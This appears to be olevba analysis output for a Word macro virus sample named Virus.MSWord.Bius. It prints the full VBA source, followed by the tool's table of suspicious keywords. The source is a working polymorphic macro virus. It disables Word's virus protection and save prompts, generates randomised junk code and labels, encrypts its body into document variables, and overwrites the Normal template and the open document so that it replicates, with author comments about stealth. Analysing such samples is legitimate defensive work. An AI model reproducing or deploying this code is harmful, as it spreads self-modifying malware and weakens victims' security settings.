olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bius
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bius - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub DOCUMENT_CLOSE()
On Error Resume Next
MOEBIUS:
Randomize Timer
Options.VirusProtection = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
GI = 8: GJ = 10: GR = 2: NX = 24: GL = 2: LO = 5
X9 = Chr(34): C = Chr(13): CC = Chr(34)
O2 = NORMAL.ThisDocument.Variables(1).Value
O3 = ActiveDocument.Variables(1).Value
'moebius
If Len(O2) > 8000 Or O4 > 18 Then
O5 = 1
Do While Not Mid(O2, Len(O2) - O4, 1) = "'"
O4 = O4 + 1
O7 = Right(O2, O4)
Loop
End If
L = Int(1 * 2)
If Len(O3) > 8000 Or O8 > 18 Then
O6 = 1
Do While Not Mid(O3, Len(O3) - O8, 1) = "'"
O8 = O8 + 1
O9 = Right(O3, O8)
Loop
End If
Set N1 = ActiveDocument.VBProject.VBCOMPONENTS(1).CODEMODULE
Set N2 = NormalTemplate.VBProject.VBCOMPONENTS(1).CODEMODULE
NI = N2.LINES(103, 1)
AI = N1.LINES(103, 1)
If Right(NI, 8) = "MOEBIUS:" Or NI = "Set N6 = N1" Then N3 = 1
If Right(AI, 8) = "MOEBIUS:" Or AI = "Set N6 = N1" Then N4 = 1
If N3 = 0 Then
Set N5 = N2
Set N6 = N1
Else
Set N5 = N1
Set N6 = N2
End If
For W = 1 To 100
N8 = N8 + C
Next W
If O5 = 1 Then V0 = O7: NE = O2: GoTo 9
With N6
For X = 1 To .COUNTOFLINES - 1
N7 = .LINES(X, 1)
If Left(N7, 1) = "'" Then GoTo 0
N8 = N8 & N7 & C
N9 = Int(5 * Rnd + 1)
If N9 = GR And X > 3 Then GoSub NA: U2 = "'" & NB & C: N8 = N8 & U2: U4 = U4 + Len(U2)
0 Next X
N8 = UCase(N8) & "END SUB" & C & "'"
RZ = Len(N8) - U4
End With
GoSub O1: V0 = NB
Do While Not Len(N8) = Len(NE)
Q = Q + 1
H = H + 1
NF = Mid(N8, Q, 1)
H1 = Mid(V0, H, 1)
NG = Chr(Asc(NF) + Asc(H1))
If H = Len(V0) Then H = 0
NE = NE + NG
Loop
NE = NE + "'" + V0
9 LO = 5
GoSub NA: J1 = NB: GoSub NA: J2 = NB: GoSub NA: J3 = NB
GoSub NA: J4 = NB: GoSub NA: J5 = NB: GoSub NA: J6 = NB
GoSub NA: J9 = NB: GoSub NA: JA = NB: GoSub NA: JB = NB
GoSub NA: JC = NB: GoSub NA: JD = NB: GoSub NA: JE = NB
GoSub NA: JF = NB: GoSub NA: JG = NB: GoSub NA: JH = NB
GoSub NA: JI = NB: GoSub NA: JJ = NB: GoSub NA: JK = NB
GoSub NA: JL = NB: GoSub NA: VX = M: GoSub NA: JM = NB
GoSub NA: V1 = NB: GoSub NA: V2 = NB: GoSub NA: V3 = NB
GoSub NA: Q1 = NB: GoSub NA: Q2 = NB: GoSub NA: Q3 = NB
GoSub NA: W1 = NB: GoSub NA: W2 = NB: GoSub NA: W3 = NB
GoSub NA: V4 = NB: GoSub NA: V5 = NB: GoSub NA: V6 = NB
GoSub NA: V7 = NB: GoSub NA: V8 = NB: GoSub NA: V9 = NB
GoSub NA: VA = NB: GoSub NA: VB = NB: GoSub NA: VC = NB
GoSub NA: NK = NB: GoSub NA: JZ = NB: GoSub NA: JV = NB
GoSub NA: TA = NB: GoSub NA: TB = NB: GoSub NA: TC = NB
GoSub NA: TD = NB: GoSub NA: TX = NB: GoSub NA: T4 = NB
GoSub NA: T5 = NB: GoSub NA: T6 = NB: GoSub NA: T7 = NB
GoSub NA: T8 = NB: WL = 10915: GoSub NA: T9 = NB
GoSub NA: JW = NB: NN = NC: GoSub NA: JX = NB: NN = 1
GoSub F1: R0 = F2: GoSub F1: RA = F2: GoSub F1: RB = F2
GoSub F1: RC = F2: GoSub F1: RD = F2: GoSub F1: RE = F2
GoSub F1: RF = F2: GoSub F1: RG = F2: GoSub F1: RH = F2
GoSub F1: RI = F2: NN = 0: GoSub F1: RJ = F2
For M1 = 1 To Len(VX): WW = WW + Asc(Mid(VX, M1, 1)): Next M1
GoTo NW
NA:
NB = Chr(Int(26 * Rnd + 65))
NL = Int((15 - LO) * Rnd + LO)
Do While Not Len(NB) = NL
6 NM = Int((122 - 48 + 1) * Rnd + 48)
If NM > 57 And NM < 65 Then GoTo 6
If NM > 90 And NM < 97 Then GoTo 6
NB = NB + Chr$(NM)
Loop
Return
O1:
NB = Chr(Int(26 * Rnd + 65))
NL = Int((15 - LO) * Rnd + LO)
Do While Not Len(NB) = NL
NM = Int((90 - 65 + 1) * Rnd + 65)
NB = NB + Chr$(NM)
Loop
Return
F1:
NH = Int(1000000 * Rnd + 999)
F3 = Int((2 - 1 + 1) * Rnd + 1)
If F3 = 1 Then NJ = NH + NN: F6 = " - " Else NJ = NN - NH: F6 = " + "
F3 = Int((2 - 1 + 1) * Rnd + 1)
If F3 = 1 Then F4 = "(": F5 = ")" Else: F4 = "": F5 = ""
F3 = Int((3 - 1 + 1) * Rnd + 1)
If F3 = 1 Then F2 = NN Else: F2 = F4 & NJ & F6 & NH & F5
Return
NU:
S = Int(3 * Rnd + 1)
If S = 1 Then NO = "= "
If S = 2 Then NO = "> "
If S = 3 Then NO = "< "
Return
NV:
XZ = ""
NZ = ""
For XA = 1 To Int((GI - 1 + 1) * Rnd + 1)
GoSub X2
XZ = XZ + C + NZ
Next XA
NZ = XZ
Return
X2:
GoSub NA: NS = NB
GoSub NA: NT = NB
NN = Int((10000 - 100 + 1) * Rnd + 100)
GoSub F1
X1 = F2
NN = Int((10000 - 100 + 1) * Rnd + 100)
GoSub F1
GoSub NU
F7 = Int((20 - 1 + 1) * Rnd + 1)
S = Int(3 * Rnd + 1)
E2 = Int(30 * Rnd + 1)
E3 = Int(29 * Rnd + 1)
If E4 = 1 Then E5 = "$" Else E5 = ""
E6 = Int(255 * Rnd + 1)
If S = 1 Then S1 = "+ "
If S = 2 Then S1 = "- "
If F7 = 1 Then NZ = "IF " & NS & NO & NJ & " THEN " & NT & "= " & NH & C1
If F7 = 2 Then NZ = "IF " & NS & NO & F2 & " THEN " & NT & "= " & X1 & C1
If F7 = 3 Then NZ = NS & " = " & NS & S1 & X1 & C1
If F7 = 4 Then NZ = NS & " = " & NT & S1 & X1 & C1
If F7 = 5 Then NZ = NS & " = " & F2 & S1 & X1 & C1
If F7 = 6 Then NZ = NS & " = " & X1 & C1
If F7 = 7 Then NZ = NS & " = " & X9 & NT & X9 & C1
If F7 = 8 Then NZ = NS & " = " & X9 & NS & X9 & "+ " & NT & C1
If F7 = 9 Then G3 = Int(2 * Rnd + 1): If G3 = 1 Then LW = "REM " Else LW = "' ": NZ = LW & NS & NT
If F7 = 10 Then NZ = NS & " = UCASE(" & X9 & NT & X9 & ")" & C1
If F7 = 11 Then NZ = NS & " = LCASE(" & X9 & NT & X9 & ")" & C1
If F7 = 12 Then NZ = NS & " = LEN(" & X9 & NT & X9 & ")" & C1
If F7 = 13 Then NZ = NS & " = LEN(" & NT & ")" & C1
If F7 = 14 Then GoSub MATHFFUNCT: NZ = NS & " =" & MATHF & "(" & NT & ")" & C1
If F7 = 15 Then NZ = NS & " = MID" & E5 & "(" & NT & "," & E2 & "," & E3 & " )" & C1
If F7 = 16 Then NZ = NS & " = LEFT" & E5 & "(" & NT & "," & E2 & ")" & C1
If F7 = 17 Then NZ = NS & " = RIGHT" & E5 & "(" & NT & "," & E2 & ")" & C1
If F7 = 18 Then NZ = NS & " = STRING" & E5 & "(" & NT & "," & E6 & ")" & C1
If F7 = 19 Then NZ = NS & " = CHR(" & E6 & ")" & C1
If F7 = 20 Then NZ = NS & " = ASC(" & X9 & Chr(E6) & X9 & ")" & C1
Return
MATHFFUNCT:
E4 = Int((2 - 1 + 1) * Rnd + 1)
E1 = Int((18 - 1 + 1) * Rnd + 1)
If E1 = 1 Then MATHF = "ABS"
If E1 = 2 Then MATHF = "ATN"
If E1 = 3 Then MATHF = "COS"
If E1 = 4 Then MATHF = "SIN"
If E1 = 5 Then MATHF = "INT"
If E1 = 6 Then MATHF = "FIX"
If E1 = 7 Then MATHF = "RND"
If E1 = 8 Then MATHF = "SGN"
If E1 = 9 Then MATHF = "SQR"
If E1 = 10 Then MATHF = "TAN"
If E1 = 11 Then MATHF = "STR" + E5
If E1 = 12 Then MATHF = "OCT" + E5
If E1 = 13 Then MATHF = "SPACE" + E5
If E1 = 14 Then MATHF = "STR" + E5
If E1 = 15 Then MATHF = "LTRIM" + E5
If E1 = 16 Then MATHF = "RTRIM" + E5
If E1 = 17 Then MATHF = "TRIM" + E5
If E1 = 18 Then MATHF = "HEX" + E5
Return
F8:
F9 = ""
G1 = ""
G2 = ""
G1 = Int((2 - 1 + 1) * Rnd + 1)
If G1 = 1 Then G4 = C & " GOTO " Else G4 = C & " GOSUB "
G1 = Int((2 - 1 + 1) * Rnd + 1)
If G1 = 1 Then GoSub NV: G5 = NZ Else G5 = ":"
F9 = G5 + G4
G1 = Int((2 - 1 + 1) * Rnd + 1)
If G1 = 1 Then GoSub NV: G2 = NZ & C Else G2 = " "
Return
2 J = 0
'If WW = WZ Then NX = NX - 1
NX = NX - 1
I = Int(NX * Rnd + 1)
NQ = Int(2 * Rnd + 1)
NN = Int(99 * Rnd + 1)
If NX = 0 Then
GoSub NV
K = K & NZ
GoSub F8
GoTo 1
End If
If NQ = 1 And NX > 0 Then
GoSub NV
K = K & NZ
End If
GoSub F8
GoTo 1
NW:
GoSub F8
WZ = WL * 2
CH = Int(2 * Rnd + 1)
If CH = 1 Then K = "PRIVATE SUB DOCUMENT_OPEN() " & F9 & JW
If CH = 2 Then K = "PRIVATE SUB DOCUMENT_NEW() " & F9 & JW
'just sample! for nice stealth i throw out every "SUB ..."!
'If CH = 3 Then K = "SUB AUTOOPEN() " & F9 & JW
'If CH = 4 Then K = "SUB AUTOEXEC() " & F9 & JW
'If CH = 5 Then K = "SUB AUTONEW() " & F9 & JW
'If CH = 6 Then K = "SUB FILEOPEN() " & F9 & JW
'If CH = 7 Then K = "SUB FILESAVE() " & F9 & JW
'If CH = 8 Then K = "SUB FILESAVEAS() " & F9 & JW
GoTo 2
Do While Not NX = 0
C = ""
'if anyone have any idea how to write this block little shorter
'then plz do it. send me a sample!
1 If A1 = 0 Then J = J + 1: If J = I Then A1 = 1: K = K & C & JW & ":" & G2 & V6 & "= THISDOCUMENT.VBPROJECT.VBCOMPONENTS(" & RA & ").CODEMODULE.COUNTOFLINES" & F9 & J2: GoTo 2
If A2 = 0 Then J = J + 1: If J = I Then A2 = 1: K = K & C & J2 & ":" & G2 & "THISDOCUMENT.VBPROJECT.VBCOMPONENTS( " & RB & ").CODEMODULE.DELETELINES ( " & RC & "), " & V6 & "" & F9 & J3: GoTo 2
If A3 = 0 Then J = J + 1: If J = I Then A3 = 1: K = K & C & J3 & ":" & G2 & V1 & "= THISDOCUMENT.VARIABLES(" & R0 & ").VALUE" & F9 & Q1: GoTo 2
If D1 = 0 Then J = J + 1: If J = I Then D1 = 1: K = K & C & Q1 & ":" & G2 & W1 & "=LEN( " & V3 & ")" & F9 & Q2: GoTo 2
If D2 = 0 Then J = J + 1: If J = I Then D2 = 1: K = K & C & Q2 & ":" & G2 & W2 & "= LEN( " & V1 & ")" & F9 & Q3: GoTo 2
If D3 = 0 Then J = J + 1: If J = I Then D3 = 1: K = K & C & Q3 & ":" & G2 & W3 & "= LEN( " & CC & V0 & CC & ")" & F9 & J4: GoTo 2
If A4 = 0 Then J = J + 1: If J = I Then A4 = 1: K = K & C & J4 & ":" & G2 & "IF " & W1 & "= " & W2 & "-" & W3 & " THEN GOTO " & JL & " ELSE " & F9 & J5: GoTo 2
If A5 = 0 Then J = J + 1: If J = I Then A5 = 1: K = K & C & J5 & ":" & G2 & V5 & "= " & V5 & "+ " & RD & F9 & JI: GoTo 2
If AC = 0 Then J = J + 1: If J = I Then AC = 1: K = K & C & JI & ":" & G2 & V8 & "= " & V8 & " + " & RI & F9 & J6: GoTo 2
If A6 = 0 Then J = J + 1: If J = I Then A6 = 1: K = K & C & J6 & ":" & G2 & V2 & "= MID( " & V1 & ", " & V5 & "," & RE & ")" & F9 & TA: GoTo 2
If TH = 0 Then J = J + 1: If J = I Then TH = 1: K = K & C & TA & ":" & G2 & T4 & "= UCASE(" & CC & V0 & CC & ")" & F9 & JJ: GoTo 2
If AD = 0 Then J = J + 1: If J = I Then AD = 1: K = K & C & JJ & ":" & G2 & V9 & "= MID(" & T4 & ", " & V8 & ", " & RH & ")" & F9 & TB: GoTo 2
If TI = 0 Then J = J + 1: If J = I Then TI = 1: K = K & C & TB & ":" & G2 & T5 & "= LEN( " & CC & V0 & CC & ")" & F9 & JK: GoTo 2
If AE = 0 Then J = J + 1: If J = I Then AE = 1: K = K & C & JK & ":" & G2 & "IF " & V8 & "= " & T5 & " THEN " & V8 & "= " & RJ & ": GOTO " & TC & " ELSE " & F9 & TC: GoTo 2
If TJ = 0 Then J = J + 1: If J = I Then TJ = 1: K = K & C & TC & ":" & G2 & T6 & "= ASC( " & V2 & ")" & F9 & TD: GoTo 2
If TK = 0 Then J = J + 1: If J = I Then TK = 1: K = K & C & TD & ":" & G2 & T7 & "= ASC( " & V9 & ")" & F9 & J9: GoTo 2
If AF = 0 Then J = J + 1: If J = I Then AF = 1: K = K & C & J9 & ":" & G2 & VB & "= " & T6 & "- " & T7 & F9 & TX: GoTo 2
If TL = 0 Then J = J + 1: If J = I Then TL = 1: K = K & C & TX & ":" & G2 & T8 & "= ABS(" & VB & ")" & F9 & JM: GoTo 2
If A7 = 0 Then J = J + 1: If J = I Then A7 = 1: K = K & C & JM & ":" & G2 & V4 & "= CHR(" & T8 & ")" & F9 & JA: GoTo 2
If A8 = 0 Then J = J + 1: If J = I Then A8 = 1: K = K & C & JA & ":" & G2 & V3 & "= " & V3 & "+ " & V4 & F9 & JB: GoTo 2
If A9 = 0 Then J = J + 1: If J = I Then A9 = 1: K = K & C & JB & ":" & G2 & F9 & Q1: GoTo 2
If TM = 0 Then J = J + 1: If J = I Then TM = 1: K = K & C & JL & ":" & G2 & T9 & "= " & CC & NK & CC & F9 & JX: GoTo 2
If AA = 0 Then J = J + 1: If J = I Then AA = 1: K = K & C & JX & ":" & G2 & "THISDOCUMENT.VBPROJECT.VBCOMPONENTS( " & RF & ").CODEMODULE.INSERTLINES " & RG & ", " & V3 & "" & F9 & JD: GoTo 2
Loop
GoSub F8
K = K & C & JD & ":" & G2 & C & " END SUB" & C
Do While Not Len(K) <= TE
TE = TE + 1
TT = Mid(K, TE, 1)
If TT = " " Or TT = "." Or TT = "," Or TT = "(" Or TT = ")" Or TT = ":" Or TT = ">" Or TT = "<" Or TT = "=" Or TT = "+" Or TT = "-" Or TT = "*" Then If Int(GJ * Rnd + 1) = 1 Then K1 = K1 + " _" + C: GoTo 4
If TT = Chr(13) And TE < Len(K) Then If Int((GL - 1 + 1) * Rnd + 1) = 1 Then GoSub NA: K1 = K1 & C & NB & ": ": If Mid(K, TE + 1, 1) = C Then TE = TE + 1: GoTo 4
G6 = Int((2 - 1 + 1) * Rnd + 1)
If G6 = 1 Then TT = UCase(TT) Else TT = LCase(TT)
4 K1 = K1 + TT
Loop
With NORMAL.ThisDocument.VBProject.VBCOMPONENTS(1).CODEMODULE
.DELETELINES 1, .COUNTOFLINES
.INSERTLINES 1, N8 + K1
End With
With ThisDocument.VBProject.VBCOMPONENTS(1).CODEMODULE
.DELETELINES 1, .COUNTOFLINES
.INSERTLINES 1, N8 + K1
End With
DoEvents
If O9 = O7 And Len(O9) > 0 Then End
If O5 <> 1 Then NORMAL.ThisDocument.Variables.Add 1, NE
If O6 <> 1 Then ActiveDocument.Variables.Add 1, NE
If O5 <> 1 And O6 <> 1 Then NORMAL.ThisDocument.Variables.Add 1, NE: ActiveDocument.Variables.Add 1, NE
ActiveDocument.Save
NormalTemplate.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |DOCUMENT_CLOSE      |Runs when the Word document is closed        |
|AutoExec  |AUTONEW             |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_NEW        |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

